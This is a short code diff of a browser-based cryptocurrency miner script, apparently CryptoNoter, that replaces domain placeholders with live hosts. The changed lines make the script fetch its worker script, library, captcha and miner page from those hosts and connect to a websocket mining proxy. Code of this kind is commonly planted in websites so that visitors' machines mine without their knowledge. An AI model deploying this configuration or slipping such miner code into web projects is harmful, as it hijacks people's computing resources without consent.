@@ -66,7 +66,7 @@
                 this._asmjsStatus = "loaded";
                 this._startNow()
             }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
+            xhr.open("get", "https://qoshlli.com/web/worker.js", true);
             xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
@@ -489,8 +489,8 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+    LIB_URL: "https://qoshlli.com/web/lib/",
+    WEBSOCKET_SHARDS: [["wss://lotteh.com/proxy"]],
+    CAPTCHA_URL: "https://qoshlli.com/web/captcha/",
+    MINER_URL: "https://qoshlli.com/web/media/miner.html"
 };
